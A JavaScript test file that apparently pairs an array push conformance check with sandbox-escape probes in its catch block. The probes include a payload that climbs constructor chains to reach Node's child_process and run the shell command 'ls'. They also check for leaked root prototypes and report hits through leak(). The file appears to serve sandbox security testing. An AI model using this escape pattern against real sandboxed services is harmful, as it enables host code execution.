try {
    var x = [];
    x.length = 4294967295;
    var push = x.push();
    if (push !== 4294967295) {
        $ERROR('#1: x = []; x.length = 4294967295; x.push() === 4294967295. Actual: ' + push);
    }
    try {
        x.push('x');
        $ERROR('#2.1: x = []; x.length = 4294967295; x.push("x") throw RangeError. Actual: ' + push);
    } catch (e) {
        if (e instanceof RangeError !== true) {
            $ERROR('#2.2: x = []; x.length = 4294967295; x.push("x") throw RangeError. Actual: ' + e);
        }
    }
    if (x[4294967295] !== 'x') {
        $ERROR('#3: x = []; x.length = 4294967295; try {x.push("x")}catch(e){}; x[4294967295] === "x". Actual: ' + x[4294967295]);
    }
    if (x.length !== 4294967295) {
        $ERROR('#4: x = []; x.length = 4294967295; try {x.push("x")}catch(e){}; x.length === 4294967295. Actual: ' + x.length);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}